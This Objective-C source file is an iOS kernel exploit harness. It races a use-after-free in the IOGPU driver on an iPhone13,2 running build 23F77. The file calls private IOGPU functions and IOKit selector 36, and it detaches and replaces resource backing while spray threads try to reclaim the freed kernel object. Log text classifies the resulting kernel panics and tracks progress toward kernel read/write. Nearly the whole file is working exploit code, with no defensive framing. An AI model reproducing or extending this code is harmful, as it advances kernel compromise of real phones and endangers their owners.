//
//  P031ReclaimHit.m
//  P007OpenOnly
//
//  Button 70 — p031 reclaim-class diagnostic (64788 confused deputy)
//  One create path: p031_create_resource (type 0x80). No page pool.
//  Calib = ABI smoke only. QoS is a hint — ips CORE is the truth.
//
//  v4: QoS fix + increased C threads + core logging
//  v3: QoS fix (same P-core cluster)
//  v2: affinity + continuous C thread spray
//

#import "P031ReclaimHit.h"
#import "A14_23F77_LabOffsets.h"
#import "LabLocalTime.h"

#import <Metal/Metal.h>
#import <objc/runtime.h>
#import <objc/message.h>
#include <pthread.h>
#include <mach/mach.h>
#include <mach/thread_policy.h>
#include <mach/thread_switch.h>
#include <mach/vm_map.h>
#include <dlfcn.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdarg.h>
#include <sys/mman.h>

#ifndef SWITCH_OPTION_YIELD
#define SWITCH_OPTION_YIELD SWITCH_OPTION_NONE
#endif

static mach_port_t p031_thread_a_port = MACH_PORT_NULL;

static void p031_micro_spin(int n) {
    volatile int spin = 0;
    for (int i = 0; i < n; i++)
        spin += i;
    (void)spin;
}

typedef kern_return_t (*p031_iocall_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);
typedef uint32_t (*p031_getconn_t)(void *);
typedef int (*p031_detach_t)(void *);
typedef int (*p031_replace_t)(void *, void *, uint64_t);
typedef uint32_t (*p031_gettype_t)(void *);

#define P031_SEL36              A14_23F77_IOGPU_SEL36
#define P031_SEL36_SCIN         A14_23F77_IOGPU_SEL36_SCIN
#define P031_SEL36_SCOUT        A14_23F77_IOGPU_SEL36_SCOUT
#define P031_RES_TYPE           A14_23F77_IOGPU_RES_TYPE_BYTES
#define P031_RES_SIZE           A14_23F77_IOGPU_RES_SIZE
#define P031_SEL36_LEN          A14_23F77_IOGPU_SEL36_LEN

#define P031_BUILD              "p031-createres-v4-qos-fix"
#define P031_RACE_SEC           60
#define P031_REPORT_INTERVAL    1
#define P031_POST_FREE_SPIN     0
#define P031_POST_HOLD_SPIN     1000
#define P031_PACK_COUNT         64  // Increased from 32 to 64
#define P031_NUM_C_THREADS      8   // Increased from 4 to 8

/* Forward declarations */

static int p031_spawn(pthread_t *th, void *(*fn)(void *), void *arg, qos_class_t qos);

#define P031_RES_ID_OFF         A14_23F77_IOGPU_RES_ID_OFF
#define P031_RES_DEVW_OFF       A14_23F77_IOGPU_RES_DEVW_OFF
#define P031_DEVW_CONN_OFF      A14_23F77_IOGPU_DEVW_CONN_OFF
/* THREAD_AFFINITY_POLICY_COUNT is not defined on 23F77 SDK */
#define P031_THREAD_POLICY_COUNT  1

static p031_iocall_t   p031_iocall = NULL;
static p031_getconn_t  p031_dev_conn_fn = NULL;
static p031_detach_t   p031_detach_fn = NULL;
static p031_replace_t  p031_replace_fn = NULL;
static p031_gettype_t  p031_gettype_fn = NULL;

static FILE *p031_fp = NULL;
static volatile int p031_stop = 0;

static id<MTLDevice> p031_mtl_device = nil;
static mach_port_t p031_device_conn = 0;

static id<MTLBuffer> p031_persistent_buf = nil;
static void *p031_persistent_ref = NULL;
static uint32_t p031_res_id = 0;

static void *p031_repl_page = NULL;

static volatile long p031_a_iters = 0;
static volatile long p031_b_iters = 0;
static volatile long p031_c_iters = 0;
static volatile int p031_a_errs = 0;
static volatile int p031_b_errs = 0;
static volatile int p031_c_errs = 0;
static volatile int p031_race_start = 0;
static volatile int p031_a_armed = 0;

static id<MTLBuffer> p031_pack_hold[P031_PACK_COUNT];

static void p031_log_sync(void) {
    if (!p031_fp) return;
    fflush(p031_fp);
    int fd = fileno(p031_fp);
    if (fd >= 0) fcntl(fd, F_FULLFSYNC);
}

static void p031_log(NSString *fmt, ...) NS_FORMAT_FUNCTION(1,2);
static void p031_log(NSString *fmt, ...) {
    if (!p031_fp) {
        NSString *docs = [NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *path = [docs stringByAppendingPathComponent:
            @"p031_reclaim_hit_log.txt"];
        p031_fp = fopen(path.UTF8String, "w");
        if (p031_fp) {
            setvbuf(p031_fp, NULL, _IONBF, 0);
            fprintf(p031_fp, "=== p031 session %s build=%s ===\n",
                    LabLocalMilitaryNow().UTF8String, P031_BUILD);
            p031_log_sync();
        }
    }
    va_list ap; va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (p031_fp) {
        fprintf(p031_fp, "%s\n", msg.UTF8String);
        p031_log_sync();
    }
    NSLog(@"p031 %@", msg);
}

static void p031_log_rate(NSString *fmt, ...) NS_FORMAT_FUNCTION(1,2);
static void p031_log_rate(NSString *fmt, ...) {
    if (!p031_fp) return;
    va_list ap; va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    fprintf(p031_fp, "%s\n", msg.UTF8String);
    fflush(p031_fp);
}

static void p031_set_thread_policy(qos_class_t qos) {
    // Just set QoS - affinity tag is inherited from main thread
    pthread_set_qos_class_self_np(qos, 0);
}

static void p031_log_core_info(void) {
    mach_msg_type_number_t policy_count = 1;
    boolean_t get_default = FALSE;
    thread_affinity_policy_data_t aff_policy;
    // 5 arguments: thread, flavor, policy, count, get_default
    kern_return_t kr = thread_policy_get(mach_thread_self(),
                                         THREAD_AFFINITY_POLICY,
                                         (thread_policy_t)&aff_policy,
                                         &policy_count,
                                         &get_default);
    if (kr == KERN_SUCCESS) {
        p031_log(@"[core] affinity_tag=%d", aff_policy.affinity_tag);
    } else {
        p031_log(@"[core] thread_policy_get FAILED kr=0x%x", kr);
    }
}

static int p031_spawn(pthread_t *th, void *(*fn)(void *), void *arg, qos_class_t qos)
{
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    (void)pthread_attr_set_qos_class_np(&attr, qos, 0);
    int e = pthread_create(th, &attr, fn, arg);
    pthread_attr_destroy(&attr);
    return e;
}

static id p031_unwrap(id obj) {
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([obj class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"]) break;
        SEL s = NSSelectorFromString(@"baseObject");
        if (![obj respondsToSelector:s]) break;
        id b = ((id (*)(id, SEL))objc_msgSend)(obj, s);
        if (!b || b == obj) break;
        obj = b;
    }
    return obj;
}


static void *p031_strip(void *p) {
    return (void *)((uintptr_t)p & 0x0000007FFFFFFFFFULL);
}

static int p031_is_heap(void *p) {
    uintptr_t x = (uintptr_t)p031_strip(p);
    if (x < 0x100000000ULL) return 0;
    if ((x & 7) != 0) return 0;
    if ((x >> 28) == 0x16) return 0;
    return 1;
}

static void *p031_ivar(id obj, const char *name) {
    if (!obj || !name) return NULL;
    Class cls = object_getClass(obj);
    while (cls) {
        unsigned int n = 0;
        Ivar *ivs = class_copyIvarList(cls, &n);
        void *val = NULL;
        for (unsigned i = 0; i < n; i++) {
            const char *nm = ivar_getName(ivs[i]);
            if (nm && strcmp(nm, name) == 0) {
                val = *(void **)((char *)(__bridge void *)obj + ivar_getOffset(ivs[i]));
                break;
            }
        }
        free(ivs);
        if (val) return val;
        cls = class_getSuperclass(cls);
    }
    return NULL;
}

static void *p031_ref(id buf) {
    buf = p031_unwrap(buf);
    SEL s = NSSelectorFromString(@"resourceRef");
    if (![buf respondsToSelector:s]) return NULL;
    return ((void *(*)(id, SEL))objc_msgSend)(buf, s);
}

static uint32_t p031_res_id_from(void *res) {
    if (!res) return 0;
    return *(uint32_t *)((uint8_t *)res + P031_RES_ID_OFF);
}

static uint32_t p031_res_conn_from(void *res) {
    if (!res) return 0;
    void *devw = p031_strip(*(void **)((uint8_t *)res + P031_RES_DEVW_OFF));
    if (!p031_is_heap(devw)) return 0;
    return *(uint32_t *)((uint8_t *)devw + P031_DEVW_CONN_OFF);
}

static int p031_setup_metal(void) {
    if (!p031_iocall) {
        void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
        p031_iocall = iokit ? (p031_iocall_t)dlsym(iokit, "IOConnectCallMethod") : NULL;
    }
    if (!p031_iocall) {
        p031_log(@"[setup] dlsym IOConnectCallMethod FAILED");
        return -1;
    }

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) {
        p031_log(@"[setup] dlopen IOGPU FAILED");
        return -1;
    }
    p031_dev_conn_fn = (p031_getconn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    p031_detach_fn   = (p031_detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    p031_replace_fn  = (p031_replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    p031_gettype_fn  = (p031_gettype_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    if (!p031_dev_conn_fn || !p031_detach_fn || !p031_replace_fn || !p031_gettype_fn) {
        p031_log(@"[setup] IOGPU syms FAILED");
        return -1;
    }

    p031_mtl_device = MTLCreateSystemDefaultDevice();
    if (!p031_mtl_device) {
        p031_log(@"[setup] MTLCreateSystemDefaultDevice FAILED");
        return -1;
    }

    id mtlDev = p031_unwrap(p031_mtl_device);
    void *devRef = p031_strip(p031_ivar(mtlDev, "_deviceRef"));
    uint32_t dconn = 0;
    if (p031_is_heap(devRef) && p031_dev_conn_fn)
        dconn = p031_dev_conn_fn(devRef);
    p031_device_conn = dconn;

    if (!p031_repl_page) {
        vm_address_t pg = 0;
        if (vm_allocate(mach_task_self(), &pg, P031_RES_SIZE, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pg) {
            p031_log(@"[setup] replace-page vm_allocate FAILED");
            return -1;
        }
        memset((void *)pg, 0x43, P031_RES_SIZE);
        (void)mlock((void *)pg, P031_RES_SIZE);
        p031_repl_page = (void *)pg;
    }

    return 0;
}

static id<MTLBuffer> p031_create_resource(uint32_t *out_id, int verbose) {
    vm_address_t pg = 0;
    if (vm_allocate(mach_task_self(), &pg, P031_RES_SIZE, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pg) {
        if (verbose) p031_log(@"[create] vm_allocate FAILED");
        return nil;
    }
    memset((void *)pg, 0x41, P031_RES_SIZE);

    id<MTLBuffer> buf = [p031_mtl_device
        newBufferWithBytesNoCopy:(void *)pg
        length:P031_RES_SIZE
        options:MTLResourceStorageModeShared
        deallocator:^(void *ptr, NSUInteger n) {
            vm_deallocate(mach_task_self(), (vm_address_t)ptr, (vm_size_t)n);
        }];
    if (!buf) {
        if (verbose) p031_log(@"[create] newBufferWithBytesNoCopy FAILED");
        vm_deallocate(mach_task_self(), pg, P031_RES_SIZE);
        return nil;
    }

    void *ref = p031_ref(buf);
    uint32_t typ = (ref && p031_gettype_fn) ? p031_gettype_fn(ref) : 0;
    uint32_t rid = p031_res_id_from(ref);
    if (verbose)
        p031_log(@"[create] type=0x%x id=%u ref=%p", typ, rid, ref);
    if (!ref || typ != P031_RES_TYPE || !rid) {
        if (verbose) p031_log(@"[create] need type 0x80 + non-zero id");
        return nil;
    }
    if (out_id) *out_id = rid;
    return buf;
}

static void p031_drop_resource(id<MTLBuffer> __strong *buf) {
    if (buf && *buf) {
        if (*buf == p031_persistent_buf)
            p031_persistent_ref = NULL;
        *buf = nil;
    }
}

static kern_return_t p031_sel36(uint32_t id) {
    uint64_t scalars[P031_SEL36_SCIN] = { id, 0, P031_SEL36_LEN };
    uint64_t out = 0;
    uint32_t outCnt = P031_SEL36_SCOUT;
    if (!p031_iocall || !p031_device_conn) return KERN_FAILURE;
    return p031_iocall(p031_device_conn, P031_SEL36,
                       scalars, P031_SEL36_SCIN,
                       NULL, 0, &out, &outCnt, NULL, NULL);
}

static int p031_detach_replace(void) {
    void *ref = p031_persistent_ref;
    if (!ref || !p031_detach_fn || !p031_replace_fn || !p031_repl_page)
        return -1;
    int d = p031_detach_fn(ref);
    int r = p031_replace_fn(ref, p031_repl_page, (uint64_t)P031_RES_SIZE);
    if (d != 0 || r != 0) {
        p031_log(@"[detach+replace] detach=%d replace=%d", d, r);
        return -1;
    }
    return 0;
}

static void p031_park_until_go(void)
{
    while (!p031_race_start && !p031_stop)
        (void)thread_switch(MACH_PORT_NULL, SWITCH_OPTION_DEPRESS, 0);
}

// Thread A - HOLDER: USER_INTERACTIVE (same P-core as B)
static void *p031_thread_a(void *arg) {
    (void)arg;
    p031_set_thread_policy(QOS_CLASS_USER_INTERACTIVE);
    p031_log_core_info();
    p031_park_until_go();
    if (p031_stop) return NULL;

    p031_a_armed = 1;

    long local_iter = 0;
    int local_err = 0;

    while (!p031_stop) {
        kern_return_t kr = p031_sel36(p031_res_id);
        if (kr == 0) local_iter++;
        else         local_err++;

        if ((local_iter & 0xff) == 0) {
            p031_a_iters += local_iter;
            p031_a_errs += local_err;
            local_iter = 0;
            local_err = 0;
        }
    }

    p031_a_iters += local_iter;
    p031_a_errs += local_err;
    return NULL;
}

// Thread B - FREER + RECLAIM: USER_INTERACTIVE (same P-core as A)
static void *p031_thread_b(void *arg) {
    (void)arg;
    p031_set_thread_policy(QOS_CLASS_USER_INTERACTIVE);
    p031_log_core_info();
    p031_park_until_go();
    if (p031_stop) return NULL;
    while (!p031_a_armed && !p031_stop)
        ;
    if (p031_stop) return NULL;

    p031_log(@"[b] Thread B starting - persistent_ref=%p", p031_persistent_ref);

    long local_iter = 0;
    int local_err = 0;
    id<MTLBuffer> held = nil;

    while (!p031_stop) {
        held = nil;

        int kr = p031_detach_replace();
        if (kr != 0) {
            local_err++;
            p031_log(@"[b] detach_replace FAILED kr=%d persistent_ref=%p", kr, p031_persistent_ref);
            continue;
        }

                // REMOVED the yield (thread_switch) entirely - make B faster

                uint32_t sid = 0;
                id<MTLBuffer> spray = p031_create_resource(&sid, 0);
                if (!spray) {
                    local_err++;
                    continue;
                }
                held = spray;
                spray = nil;

                local_iter++;
            if ((local_iter & 0xff) == 0) {
                p031_b_iters += local_iter;
                p031_b_errs += local_err;
                local_iter = 0;
                local_err = 0;
            }
        }

    held = nil;
    p031_b_iters += local_iter;
    p031_b_errs += local_err;
    return NULL;
}

// Thread C - SPRAY: continuous create+drop (magazine cycler)
static void *p031_thread_c(void *arg) {
    (void)arg;
    p031_set_thread_policy(QOS_CLASS_USER_INTERACTIVE);
    p031_log_core_info();
    p031_park_until_go();
    if (p031_stop) return NULL;

    long local_iter = 0;
    int local_err = 0;

    while (!p031_stop) {
        uint32_t sid = 0;
        id<MTLBuffer> buf = p031_create_resource(&sid, 0);
        if (buf) {
            p031_drop_resource(&buf);
            local_iter++;
        } else {
            local_err++;
        }

        if ((local_iter & 0xff) == 0) {
            p031_c_iters += local_iter;
            p031_c_errs += local_err;
            local_iter = 0;
            local_err = 0;
        }
    }

    p031_c_iters += local_iter;
    p031_c_errs += local_err;
    return NULL;
}

static void p031_pack_b0_magazine(void) {
    p031_set_thread_policy(QOS_CLASS_USER_INTERACTIVE);

    p031_log(@"[pack] create_resource+drop ×%d (same path as B; not a depot prime)",
             P031_PACK_COUNT);

    int ok = 0;
    for (int i = 0; i < P031_PACK_COUNT; i++) {
        uint32_t sid = 0;
        id<MTLBuffer> buf = p031_create_resource(&sid, 0);
        p031_pack_hold[i] = buf;
        if (buf) ok++;
    }
    p031_log(@"[pack] held %d/%d type-0x80 objects", ok, P031_PACK_COUNT);

    for (int i = 0; i < P031_PACK_COUNT; i++)
        p031_pack_hold[i] = nil;

    for (int i = 0; i < 4; i++)
        (void)thread_switch(MACH_PORT_NULL, SWITCH_OPTION_NONE, 0);

    p031_log(@"[pack] drop done — arming A+B");
}

static int p031_calibrate(void) {
    p031_log(@"=== p031 calib: ABI smoke (create_resource / sel36 / detach+replace) ===");
    p031_log(@"[*] NOT KRW. Diagnostic only. want ips cd8/d00 not cc8");

    if (p031_setup_metal() != 0) {
        p031_log(@"[calib] Metal setup FAILED");
        return -1;
    }

    p031_set_thread_policy(QOS_CLASS_USER_INTERACTIVE);

    p031_persistent_buf = p031_create_resource(&p031_res_id, 1);
    if (!p031_persistent_buf || p031_res_id == 0) {
        p031_log(@"[calib] Persistent resource create FAILED");
        return -1;
    }
    p031_persistent_ref = p031_ref(p031_persistent_buf);
    if (!p031_persistent_ref) {
        p031_log(@"[calib] Persistent resourceRef FAILED");
        return -1;
    }
    {
        uint32_t dconn = (uint32_t)p031_device_conn;
        uint32_t rconn = p031_res_conn_from(p031_persistent_ref);
        uint32_t conn = dconn ? dconn : rconn;
        p031_device_conn = conn;
        p031_log(@"[calib] id=%u type=0x%x dconn=%u rconn=%u using=%u",
                 p031_res_id, P031_RES_TYPE, dconn, rconn, conn);
        if (!conn) {
            p031_log(@"[calib] no IOGPU conn");
            return -1;
        }
    }

    kern_return_t kr = p031_sel36(p031_res_id);
    if (kr != 0) {
        p031_log(@"[calib] A sel36 FAILED kr=0x%x", kr);
        return -1;
    }
    p031_log(@"[calib] A sel36 SUCCESS");

    if (p031_detach_replace() != 0) {
        p031_log(@"[calib] B detach+replace FAILED");
        return -1;
    }
    p031_log(@"[calib] B detach+replace SUCCESS");

    kr = p031_sel36(p031_res_id);
    if (kr != 0) {
        p031_log(@"[calib] A sel36-after-replace FAILED kr=0x%x", kr);
        return -1;
    }
    p031_log(@"[calib] A sel36-after-replace SUCCESS — race armed");
    return 0;
}

static void p031_race(void) {
    p031_stop = 0;
    p031_a_iters = 0;
        p031_b_iters = 0;
        p031_c_iters = 0;
        p031_a_errs = 0;
        p031_b_errs = 0;
        p031_c_errs = 0;
    p031_race_start = 0;
    p031_a_armed = 0;
    p031_thread_a_port = MACH_PORT_NULL;
    for (int i = 0; i < P031_PACK_COUNT; i++)
        p031_pack_hold[i] = nil;

    p031_log(@"[race] START");
    p031_log(@"[race] build=%s create=create_resource", P031_BUILD);
    p031_log(@"[race] A=USER_INTERACTIVE B=USER_INTERACTIVE (same affinity tag 1)");
    p031_log(@"[race] A/B pre-spawned, park on race_start; B waits a_armed");
    p031_log(@"[race] B: free → yield(DEPRESS) → create_resource+HOLD");
        p031_log(@"[race] C×%d: continuous create+drop (magazine cycler)",
                 P031_NUM_C_THREADS);
        p031_log(@"[race] pack create+drop ×%d then wake A+B+C",
                 P031_PACK_COUNT);
    p031_log(@"[race] panic PC classify:");
    p031_log(@"[race]   miss  0x%llx (cc8) / fn4 0x95c9564",
             (unsigned long long)A14_23F77_PANIC_CC8);
    p031_log(@"[race]   WANT  0x%llx (cd8) / 0x%llx (d00) / OSObject",
             (unsigned long long)A14_23F77_PANIC_RETAIN_BLRAA,
             (unsigned long long)A14_23F77_PANIC_RELEASE_BLRAA);
    // Set affinity for main thread before spawning
        thread_affinity_policy_data_t main_aff;
        main_aff.affinity_tag = 1;
        thread_policy_set(mach_thread_self(),
                          THREAD_AFFINITY_POLICY,
                          (thread_policy_t)&main_aff,
                          (mach_msg_type_number_t)1);

        pthread_t ta, tb, tc[P031_NUM_C_THREADS];

        p031_spawn(&ta, p031_thread_a, NULL, QOS_CLASS_USER_INTERACTIVE);
        p031_spawn(&tb, p031_thread_b, NULL, QOS_CLASS_USER_INTERACTIVE);
        for (int i = 0; i < P031_NUM_C_THREADS; i++)
            p031_spawn(&tc[i], p031_thread_c, NULL, QOS_CLASS_USER_INTERACTIVE);
        p031_thread_a_port = pthread_mach_thread_np(ta);
        p031_log(@"[race] A/B/C×%d parked (portA=0x%x)", P031_NUM_C_THREADS, p031_thread_a_port);

    p031_pack_b0_magazine();

    p031_log(@"[race] GO — wake parked A then B (a_armed gates first replace)");
    p031_race_start = 1;

    for (int t = P031_REPORT_INTERVAL; t <= P031_RACE_SEC; t += P031_REPORT_INTERVAL) {
        usleep(P031_REPORT_INTERVAL * 1000000);
        if (p031_stop) break;
        p031_log_rate(@"[race] t=%ds A=%ld B=%ld C=%ld errA=%d errB=%d errC=%d",
                              t, p031_a_iters, p031_b_iters, p031_c_iters,
                              p031_a_errs, p031_b_errs, p031_c_errs);
        p031_log_sync();
    }

    p031_stop = 1;
        p031_race_start = 1;
        pthread_join(ta, NULL);
        pthread_join(tb, NULL);
        for (int i = 0; i < P031_NUM_C_THREADS; i++)
            pthread_join(tc[i], NULL);
        p031_thread_a_port = MACH_PORT_NULL;
    
    p031_log(@"[race] FINAL A=%ld B=%ld C=%ld errA=%d errB=%d errC=%d",
                 p031_a_iters, p031_b_iters, p031_c_iters,
                 p031_a_errs, p031_b_errs, p031_c_errs);
    p031_log(@"[race] SURVIVED — check ips; %s", P031_BUILD);
    p031_log(@"[race] cc8 = miss. OSObject = retain already ran, refcnt=0. cd8/d00 = live GMD (unseen).");
    p031_log(@"[race] spins are not a µs window. Magazine is cap-8 LIFO. Kernel slide is +0x8000 — do not use.");
}

static NSString *p031_return_log(NSString *tag) {
    if (p031_fp) { fflush(p031_fp); fclose(p031_fp); p031_fp = NULL; }
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *path = [docs stringByAppendingPathComponent:
        @"p031_reclaim_hit_log.txt"];
    NSString *body = [NSString stringWithContentsOfFile:path
                                               encoding:NSUTF8StringEncoding
                                                  error:nil] ?: @"(no log file)";
    return [NSString stringWithFormat:
            @"=== LIVE TAP %s (%@) ===\n%@\n",
            P031_BUILD, tag, body];
}

@implementation P031ReclaimHit

+ (NSString *)tap {
    p031_stop = 1;
    p031_race_start = 1;
    if (p031_fp) { fclose(p031_fp); p031_fp = NULL; }
    p031_drop_resource(&p031_persistent_buf);
    p031_persistent_ref = NULL;
    p031_res_id = 0;
    p031_device_conn = 0;
    p031_mtl_device = nil;
    for (int i = 0; i < P031_PACK_COUNT; i++)
        p031_pack_hold[i] = nil;
    p031_thread_a_port = MACH_PORT_NULL;
    p031_stop = 0;
    p031_race_start = 0;
    p031_a_armed = 0;

    p031_log(@"========================================");
    p031_log(@"BUILD %s (compiled %s %s)", P031_BUILD, __DATE__, __TIME__);
    p031_log(@"target: iPhone13,2 A14 26.5/23F77");
    p031_log(@"FKT twin: SysMemory MD +0x%x (21D50 +0x80 MOVED — not this phone) IOSurface+0x%x GMD 0x%x",
             (unsigned)A14_23F77_SYSMEM_MD_OFF,
             (unsigned)A14_23F77_IOSURFACE_MD_SLOT,
             (unsigned)A14_23F77_GMD_ELEMSZ);
    p031_log(@"spray = type 0x80 create_resource. S closed. cd8/d00 ≠ KRW.");
    p031_log(@"A=USER_INTERACTIVE B=USER_INTERACTIVE (same affinity tag 1)");
    p031_log(@"free→create spin×%d; hold spin×%d; pack create+drop ×%d",
             P031_POST_FREE_SPIN, P031_POST_HOLD_SPIN, P031_PACK_COUNT);
    p031_log(@"ABI: sel=%u scIn=%u scOut=%u len=0x%x type=0x%x size=0x%x",
             P031_SEL36, P031_SEL36_SCIN, P031_SEL36_SCOUT,
             (unsigned)P031_SEL36_LEN, (unsigned)P031_RES_TYPE, (unsigned)P031_RES_SIZE);
    p031_log(@"");
    p031_log(@"Race shape:");
    p031_log(@"  A: sel36 ALWAYS (ungated)");
    p031_log(@"  B: free → spin×%d → create_resource+HOLD → spin×%d",
             P031_POST_FREE_SPIN, P031_POST_HOLD_SPIN);
    p031_log(@"  pack create+drop ×%d then wake A+B", P031_PACK_COUNT);
    p031_log(@"");
    p031_log(@"ips classify (unslid = live - KernelCache_slide; NOT Kernel slide):");
    p031_log(@"  miss  0x%llx (cc8 zero-vt) / fn4+0xb8 0x95c9564 getSize",
             (unsigned long long)A14_23F77_PANIC_CC8);
    p031_log(@"  OSObject retain-a-freed: retain already ran (LR often 0x9857cdc AFTER cd8)");
    p031_log(@"  WANT  0x%llx (cd8) / 0x%llx (d00) — never seen on Mac IPS",
             (unsigned long long)A14_23F77_PANIC_RETAIN_BLRAA,
             (unsigned long long)A14_23F77_PANIC_RELEASE_BLRAA);
    p031_log(@"========================================");

    if (p031_calibrate() != 0) {
        p031_log(@"=== verdict: CALIB FAILED ===");
        p031_log(@"NOT KRW. Diagnostic only.");
        return p031_return_log(@"calib failed");
    }

    p031_race();

    p031_log(@"=== verdict: SURVIVED (or check ips) ===");
    p031_log(@"note: cc8=miss cd8/d00=hit. NOT KRW.");
    p031_log(@"next: cd8/d00 = install only (S closed for type 0x80). W still missing.");
    p031_log(@"      cc8 again → check CORE in ips (E-core confounder)");

    if (p031_persistent_buf) {
        p031_drop_resource(&p031_persistent_buf);
    }
    return p031_return_log(@"finished");
}

@end
